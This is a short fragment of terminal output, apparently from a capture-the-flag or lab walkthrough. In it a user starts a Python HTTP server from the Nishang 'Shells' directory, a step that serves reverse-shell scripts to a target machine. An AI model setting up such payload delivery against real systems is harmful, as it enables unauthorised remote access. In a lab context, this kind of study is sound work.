:~/IronCorp/nishang/Shells# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```


